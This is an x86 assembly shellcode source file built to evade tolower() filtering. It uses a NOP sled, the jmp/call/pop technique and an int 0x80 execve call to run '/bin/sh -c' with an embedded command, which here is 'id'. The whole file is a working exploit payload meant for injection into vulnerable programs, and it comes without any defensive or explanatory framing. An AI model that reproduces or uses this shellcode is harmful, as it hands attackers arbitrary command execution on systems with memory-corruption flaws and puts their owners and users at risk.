# tolower() execve() /bin/sh -c (user supplied command)
# shellcode to evade tolower() and friends, requires %esi
# to reference a valid writeable address (usually does)
.text
	.global _start
_start:
        jmp data
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
start:
	popl    %edi
        movl    %edi, %ecx
        xorl    %eax,%eax
	movl    %eax,%es:(%esi)
	pushl   %es:(%esi)
	pushl   $0x68732f2f
	pushl   $0x6e69622f
	movl    %esp,%ebx
	movl    %eax,%es:(%esi)
	pushl   %es:(%esi)
	pushw   $0x632d
	movl    %esp,%edi
	movl    %eax,%es:(%esi)
	pushl   %es:(%esi)
	movl    %ecx,%eax
        movl    %eax,%es:(%esi)
	pushl   %es:(%esi)
	movl    %edi,%eax
        movl    %eax,%es:(%esi)
 	pushl   %es:(%esi)
        movl    %ebx,%eax
	movl    %eax,%es:(%esi)
	pushl   %es:(%esi)
	movl    %esp,%esi
	movl    %esi,%ecx
	xorl    %eax, %eax
	movb    $0x08, %al
	addb    $0x03, %al
	int     $0x80
data:
	call start
    	#command
.ascii "id"